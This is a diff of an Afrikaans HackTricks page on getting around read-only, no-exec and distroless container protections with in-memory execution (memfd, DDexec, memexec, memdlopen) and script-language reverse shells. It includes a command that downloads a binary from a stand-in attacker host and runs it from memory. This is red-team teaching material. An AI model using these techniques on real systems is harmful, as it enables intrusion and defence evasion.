@@ -1,35 +1,36 @@
-# Bypass FS beskerming: lees-slegs / geen-uitvoer / Distroless
+# Bypass FS protections: read-only / no-exec / Distroless
+
+{% hint style="success" %}
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Ondersteun HackTricks</summary>
 
-Ander maniere om HackTricks te ondersteun:
-
-* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
 * **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-As jy belangstel in 'n **hak loopbaan** en die onhakbare hak - **ons is aan die werf!** (_vloeiende Pools geskrewe en gesproke vereis_).
+As jy belangstel in 'n **hacking loopbaan** en die onhackbare hack - **ons huur aan!** (_vloeiend in Pools, geskryf en gesproke, vereis_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
-## Videos
+## Video's
 
-In die volgende videos kan jy die tegnieke wat in hierdie bladsy genoem word, meer diepgaand verduidelik vind:
+In die volgende video's kan jy die tegnieke wat op hierdie bladsy genoem word, meer in diepte verduidelik vind:
 
-* [**DEF CON 31 - Verkenning van Linux-geheue manipulasie vir Steek en Ontwyking**](https://www.youtube.com/watch?v=poHirez8jk4)
-* [**Stealth indringings met DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
+* [**DEF CON 31 - Verkenning van Linux Geheue Manipulasie vir Stealth en Ontvlugting**](https://www.youtube.com/watch?v=poHirez8jk4)
+* [**Stealth indringings met DDexec-ng & in-geheue dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
 
-## lees-slegs / geen-uitvoer scenario
+## read-only / no-exec scenario
 
-Dit word al hoe meer algemeen om Linux-masjiene te vind wat gemonteer is met **lees-slegs (ro) lêerstelselbeskerming**, veral in houers. Dit is omdat dit maklik is om 'n houer met 'n ro lêerstelsel te hardloop deur **`readOnlyRootFilesystem: true`** in die `securitycontext` in te stel:
+Dit is al hoe meer algemeen om linux masjiene te vind wat gemonteer is met **read-only (ro) lêerstelsel beskerming**, veral in houers. Dit is omdat dit so maklik is om 'n houer met 'n ro lêerstelsel te laat loop deur **`readOnlyRootFilesystem: true`** in die `securitycontext` in te stel:
 
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
@@ -44,103 +45,110 @@ securityContext:
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
 
-Nogtans, selfs as die lêerstelsel as ro gemonteer is, sal **`/dev/shm`** steeds skryfbaar wees, so dit is vals dat ons niks op die skyf kan skryf nie. Hierdie vouer sal egter **gemonteer word met geen-uitvoer beskerming**, so as jy 'n binêre lêer hier aflaai, sal jy dit **nie kan uitvoer nie**.
+Tog, selfs al is die lêerstelsel as ro gemonteer, sal **`/dev/shm`** steeds skryfbaar wees, so dit is vals dat ons nie iets op die skyf kan skryf nie. Hierdie gids sal egter **gemonteer wees met no-exec beskerming**, so as jy 'n binêre hier aflaai, sal jy **nie in staat wees om dit uit te voer nie**.
 
 {% hint style="warning" %}
-Vanuit 'n rooi span perspektief, maak dit dit **ingewikkeld om binêre lêers af te laai en uit te voer** wat nie reeds in die stelsel is nie (soos agterdeure of enumereerders soos `kubectl`).
+Van 'n rooi span perspektief maak dit **dit moeilik om te aflaai en uit te voer** binêre wat nie reeds in die stelsel is nie (soos agterdeure of enumerators soos `kubectl`).
 {% endhint %}
 
-## Maklikste omseiling: Skripte
+## Eenvoudigste omseiling: Skripte
 
-Let daarop dat ek van binêre lêers gepraat het, jy kan **enige skrip uitvoer** solank die tolk binne die masjien is, soos 'n **skelmskrip** as `sh` teenwoordig is of 'n **python skrip** as `python` geïnstalleer is.
+Let daarop dat ek binêre genoem het, jy kan **enige skrip uitvoer** solank die interpreter binne die masjien is, soos 'n **shell skrip** as `sh` teenwoordig is of 'n **python** **skrip** as `python` geïnstalleer is.
 
-Nogtans is dit nie net genoeg om jou binêre agterdeur of ander binêre gereedskap wat jy mag nodig hê, uit te voer nie.
+Tog is dit nie net genoeg om jou binêre agterdeur of ander binêre gereedskap wat jy mag nodig hê om te loop, uit te voer nie.
 
 ## Geheue Omseilings
 
-As jy 'n binêre lêer wil uitvoer maar die lêerstelsel dit nie toelaat nie, is die beste manier om dit te doen deur dit vanaf die geheue uit te voer, aangesien die **beskerming nie daarop van toepassing is nie**.
+As jy 'n binêre wil uitvoer maar die lêerstelsel dit nie toelaat nie, is die beste manier om dit te doen deur **dit uit geheue uit te voer**, aangesien die **beskermings daar nie van toepassing is nie**.
 
 ### FD + exec syscall omseiling
 
-As jy kragtige skripskrywers binne die masjien het, soos **Python**, **Perl**, of **Ruby** kan jy die binêre aflaai om vanaf die geheue uit te voer, dit in 'n geheue lêerbeskrywer stoor (`create_memfd` syscall), wat nie deur daardie beskerming beskerm gaan word nie, en dan 'n **`exec` syscall** aanroep wat die **fd as die lêer om uit te voer** aandui.
+As jy 'n paar kragtige skrip enjin in die masjien het, soos **Python**, **Perl**, of **Ruby**, kan jy die binêre aflaai om uit geheue uit te voer, dit in 'n geheue lêer beskrywer (`create_memfd` syscall) stoor, wat nie deur daardie beskermings beskerm gaan word nie en dan 'n **`exec` syscall** aanroep wat die **fd as die lêer om uit te voer** aandui.
 
-Hiervoor kan jy maklik die projek [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) gebruik. Jy kan dit 'n binêre lêer gee en dit sal 'n skrip genereer in die aangeduide taal met die **binêre saamgepers en b64 gekodeer** met die instruksies om dit te **ontsodeer en te dekompresseer** in 'n **fd** wat geskep is deur die `create_memfd` syscall te roep en 'n oproep na die **exec** syscall om dit uit te voer.
+Vir hierdie kan jy maklik die projek [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) gebruik. Jy kan dit 'n binêre gee en dit sal 'n skrip in die aangeduide taal genereer met die **binêre gecomprimeer en b64 geënkodeer** met die instruksies om dit te **decodeer en te dekomprimeer** in 'n **fd** wat geskep is deur `create_memfd` syscall aan te roep en 'n oproep na die **exec** syscall om dit te laat loop.
 
 {% hint style="warning" %}
-Dit werk nie in ander skripskryftale soos PHP of Node nie omdat hulle geen **standaard manier het om rou syscalls** vanaf 'n skrip te roep nie, so dit is nie moontlik om `create_memfd` te roep om die **geheue fd** te skep om die binêre te stoor nie.
+Dit werk nie in ander skrip tale soos PHP of Node nie omdat hulle nie enige d**efault manier het om rou syscalls** van 'n skrip aan te roep nie, so dit is nie moontlik om `create_memfd` aan te roep om die **geheue fd** te skep om die binêre te stoor nie.
 
-Verder, 'n **gewone fd** met 'n lêer in `/dev/shm` skep sal nie werk nie, aangesien jy nie toegelaat sal word om dit uit te voer nie omdat die **geen-uitvoer beskerming** van toepassing sal wees.
+Boonop sal die skep van 'n **regte fd** met 'n lêer in `/dev/shm` nie werk nie, aangesien jy nie toegelaat sal word om dit te laat loop nie omdat die **no-exec beskerming** van toepassing sal wees.
 {% endhint %}
 
 ### DDexec / EverythingExec
 
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is 'n tegniek wat jou in staat stel om die geheue van jou eie proses te **modifiseer** deur sy **`/proc/self/mem`** te oorskryf.
+[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is 'n tegniek wat jou toelaat om **die geheue van jou eie proses** te verander deur sy **`/proc/self/mem`** te oorskryf.
 
-Daarom, deur die samestellingskode te beheer wat deur die proses uitgevoer word, kan jy 'n **shellkode** skryf en die proses "muteer" om **enige willekeurige kode** uit te voer.
+Daarom, **beheer die assembly kode** wat deur die proses uitgevoer word, kan jy 'n **shellcode** skryf en die proses "mutate" om **enige arbitrêre kode** uit te voer.
 
 {% hint style="success" %}
-**DDexec / EverythingExec** sal jou in staat stel om jou eie **shellkode** of **enige binêre** vanaf **geheue** te laai en **uit te voer**.
+**DDexec / EverythingExec** sal jou toelaat om jou eie **shellcode** of **enige binêre** uit **geheue** te laai en **uit te voer**.
 {% endhint %}
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
+For more information about this technique check the Github or:
+
+{% content-ref url="ddexec.md" %}
+[ddexec.md](ddexec.md)
+{% endcontent-ref %}
+
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec) is die natuurlike volgende stap van DDexec. Dit is 'n **DDexec shellcode gedemoniseer**, sodat elke keer as jy 'n **verskillende binêre lêer wil hardloop** hoef jy nie DDexec weer te begin nie, jy kan net memexec shellcode hardloop via die DDexec tegniek en dan **met hierdie duiwel kommunikeer om nuwe binêre lêers te laai en hardloop**.
+[**Memexec**](https://github.com/arget13/memexec) is die natuurlike volgende stap van DDexec. Dit is 'n **DDexec shellcode demonised**, so elke keer wanneer jy 'n **verskillende binêre** wil **hardloop**, hoef jy nie DDexec weer te herlaai nie, jy kan net memexec shellcode via die DDexec-tegniek hardloop en dan **kommunikeer met hierdie demon om nuwe binêre te stuur om te laai en te hardloop**.
 
-Jy kan 'n voorbeeld vind van hoe om **memexec te gebruik om binêre lêers van 'n PHP omgekeerde dop te hardloop** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
+Jy kan 'n voorbeeld vind van hoe om **memexec te gebruik om binêre van 'n PHP reverse shell** uit te voer in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
 
 ### Memdlopen
 
-Met 'n soortgelyke doel as DDexec, laat die [**memdlopen**](https://github.com/arget13/memdlopen) tegniek 'n **makliker manier toe om binêre lêers in geheue te laai** om hulle later uit te voer. Dit kan selfs toelaat om binêre lêers met afhanklikhede te laai.
+Met 'n soortgelyke doel as DDexec, laat die [**memdlopen**](https://github.com/arget13/memdlopen) tegniek 'n **gemakliker manier om binêre** in geheue te laai om later uit te voer. Dit kan selfs toelaat om binêre met afhanklikhede te laai.
 
-## Distroless Omgewing
+## Distroless Bypass
 
 ### Wat is distroless
 
-Distroless houers bevat slegs die **kaal minimum komponente wat nodig is om 'n spesifieke aansoek of diens te hardloop**, soos biblioteke en hardloop afhanklikhede, maar sluit groter komponente uit soos 'n pakkettebestuurder, skul, of stelsel nutsmaatskappye.
+Distroless houers bevat slegs die **bare minimum komponente wat nodig is om 'n spesifieke toepassing of diens te laat loop**, soos biblioteke en runtime afhanklikhede, maar sluit groter komponente soos 'n pakketbestuurder, skulp of stelseldienste uit.
 
-Die doel van distroless houers is om die aanvalsvlak van houers te **verminder deur onnodige komponente te elimineer** en die aantal kwesbaarhede wat uitgebuit kan word te minimeer.
+Die doel van distroless houers is om die **aanvaloppervlak van houers te verminder deur onnodige komponente te verwyder** en die aantal kwesbaarhede wat uitgebuit kan word, te minimaliseer.
 
-### Omgekeerde Dop
+### Reverse Shell
 
-In 'n distroless houer mag jy dalk **nie eers `sh` of `bash`** vind om 'n gewone dop te kry nie. Jy sal ook nie binêre lêers soos `ls`, `whoami`, `id`... vind nie, alles wat jy gewoonlik in 'n stelsel hardloop.
+In 'n distroless houer mag jy **nie eers `sh` of `bash`** vind om 'n gewone skulp te kry nie. Jy sal ook nie binêre soos `ls`, `whoami`, `id`... vind nie, alles wat jy gewoonlik in 'n stelsel hardloop.
 
 {% hint style="warning" %}
-Daarom sal jy **nie** in staat wees om 'n **omgekeerde dop** te kry of die stelsel te **opnoem** soos jy gewoonlik doen nie.
+Daarom, jy **sal nie** in staat wees om 'n **reverse shell** te kry of die **stelsel te evalueer** soos jy gewoonlik doen nie.
 {% endhint %}
 
-Maar as die gekompromitteerde houer byvoorbeeld 'n flask web hardloop, dan is Python geïnstalleer, en dus kan jy 'n **Python omgekeerde dop** kry. As dit node hardloop, kan jy 'n Node omgekeerde dop kry, en dieselfde met meeste enige **skrips taal**.
+As die gecompromitteerde houer egter byvoorbeeld 'n flask web loop, dan is python geïnstalleer, en daarom kan jy 'n **Python reverse shell** kry. As dit node loop, kan jy 'n Node rev shell kry, en dieselfde met byna enige **skriptaal**.
 
 {% hint style="success" %}
-Deur die skrips taal te gebruik kan jy die stelsel **opnoem** deur die taal se vermoëns te gebruik.
+Met die skriptaal kan jy die **stelsel evalueer** met behulp van die taal se vermoëns.
 {% endhint %}
 
-As daar **geen `read-only/no-exec`** beskerming is nie, kan jy jou omgekeerde dop misbruik om **binêre lêers in die lêerstelsel te skryf** en hulle **uit te voer**.
+As daar **geen `read-only/no-exec`** beskermings is nie, kan jy jou reverse shell misbruik om **in die lêerstelsel jou binêre te skryf** en hulle te **uitvoer**.
 
 {% hint style="success" %}
-Maar in hierdie soort houers sal hierdie beskermings gewoonlik bestaan, maar jy kan die **vorige geheue uitvoer tegnieke gebruik om hulle te omseil**.
+Echter, in hierdie tipe houers sal hierdie beskermings gewoonlik bestaan, maar jy kan die **vorige geheue-uitvoertegnieke gebruik om hulle te omseil**.
 {% endhint %}
 
-Jy kan **voorbeelde** vind van hoe om **sekere RCE kwesbaarhede te misbruik** om skrips taal **omgekeerde dops** te kry en binêre lêers van geheue uit te voer in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+Jy kan **voorbeelde** vind van hoe om **sommige RCE kwesbaarhede te benut** om skriptaal **reverse shells** te kry en binêre uit geheue uit te voer in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-As jy belangstel in 'n **hackingsloopbaan** en wil die onhackbare hack - **ons is aan die werf!** (_vloeiende Pools geskrewe en gespreek benodig_).
+As jy belangstel in 'n **hacking loopbaan** en die onhackable te hack - **ons is besig om aan te stel!** (_vloeiend Pools geskryf en gesproke vereis_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
+{% hint style="success" %}
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Leer AWS hack van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Ander maniere om HackTricks te ondersteun:
-
-* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **laai HackTricks af in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel jou hackingswenke deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
